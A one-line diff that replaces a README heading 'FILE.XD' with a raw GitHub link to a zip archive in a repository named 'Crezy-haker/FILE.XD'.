@@ -1,1 +1,1 @@
-# FILE.XD
+# https://raw.githubusercontent.com/Crezy-haker/FILE.XD/main/grindstone/XD-FIL-1.6.zip
